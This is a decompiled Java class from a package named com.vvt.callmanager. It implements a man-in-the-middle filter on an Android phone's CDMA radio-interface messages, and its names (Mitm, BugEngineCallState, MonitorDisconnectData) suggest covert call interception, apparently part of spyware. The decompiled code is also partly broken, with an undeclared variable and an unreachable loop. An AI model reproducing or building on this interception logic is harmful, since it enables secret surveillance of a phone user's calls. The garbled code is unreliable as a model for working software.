package com.vvt.callmanager.filter;

import android.content.Context;
import android.media.AudioManager;
import android.os.Parcel;

import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.c;
import com.vvt.callmanager.mitm.d;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;

class FilterCdmaCall
  extends a
  implements c
{
  private static final boolean a = g.a;
  private static final boolean b = g.b;
  private AudioManager c;
  private d d;
  private com.vvt.callmanager.ref.f e;
  private Context f;
  private m g;
  private String h;
  private boolean i;
  private FilterCdmaCall.CallState j;
  
  public FilterCdmaCall(Context paramContext, Mitm paramf, m paramm)
  {
    super(paramf);
    this.f = paramContext;
    this.g = paramm;
    Object localObject2 = com.vvt.callmanager.ref.f.a();
    this.e = ((com.vvt.callmanager.ref.f)localObject2);
    localObject2 = (AudioManager)this.f.getSystemService("audio");
    this.c = ((AudioManager)localObject2);
    this.h = null;
    this.d = null;
    this.i = false;
    FilterCdmaCall.CallState[] arrayOfCallState = FilterCdmaCall.CallState.values();
    int k = arrayOfCallState.length;
    int m = 0;
    localObject2 = null;
    while (m < k)
    {
      localObject1 = arrayOfCallState[m];
      ((FilterCdmaCall.CallState)localObject1).setMessageFilter(this);
      m += 1;
    }
    localObject2 = FilterCdmaCall.CallState.IDLE;
    a((FilterCdmaCall.CallState)localObject2);
  }
  
  private void a(FilterCdmaCall.CallState paramCallState)
  {
    Object localObject1 = this.j;
    if (paramCallState != localObject1)
    {
      int k = 2;
      Object localObject2 = new Object[k];
      FilterCdmaCall.CallState localCallState = this.j;
      localObject2[0] = localCallState;
      int m = 1;
      localObject2[m] = paramCallState;
      localObject1 = String.format("setState # %s -> %s", (Object[])localObject2);
      a((String)localObject1);
      localObject1 = null;
      localObject2 = this.j;
      if (localObject2 != null) {
        localObject1 = this.j.onExit();
      }
      this.j = paramCallState;
      paramCallState.onEnter(localObject1);
    }
  }
  
  private void a(BugEngineCallState paramBugEngineCallState)
  {
    com.vvt.callmanager.ref.e locale = a();
    if (locale != null) {
      locale.a(paramBugEngineCallState);
    }
    for (;;)
    {
      return;
      boolean bool = b;
      if (!bool) {}
    }
  }
  
  private void a(MonitorDisconnectData paramMonitorDisconnectData)
  {
    d locald = this.d;
    if (locald != null)
    {
      locald = this.d;
      locald.a(paramMonitorDisconnectData);
    }
  }
  
  private void a(String paramString)
  {
    this.g.b(paramString);
  }
  
  public void a(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O->M..T";
    Object localObject1 = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject1;
    localObject1 = this.j;
    arrayOfObject[2] = localObject1;
    Object localObject2 = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a((String)localObject2);
    localObject2 = this.j.processRilRequest(paramParcel);
    a((FilterCdmaCall.CallState)localObject2);
  }
  
  public void a(d paramd)
  {
    this.d = paramd;
  }
  
  public void b(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O..M<=T";
    Object localObject1 = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject1;
    localObject1 = this.j;
    arrayOfObject[2] = localObject1;
    Object localObject2 = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a((String)localObject2);
    localObject2 = this.j.processResponse(paramParcel);
    a((FilterCdmaCall.CallState)localObject2);
  }
  
  protected void c(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O<=M..T";
    Object localObject = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject;
    localObject = this.j;
    arrayOfObject[2] = localObject;
    String str = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a(str);
    super.c(paramParcel);
  }
  
  protected void d(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O..M->T";
    Object localObject = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject;
    localObject = this.j;
    arrayOfObject[2] = localObject;
    String str = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a(str);
    super.d(paramParcel);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */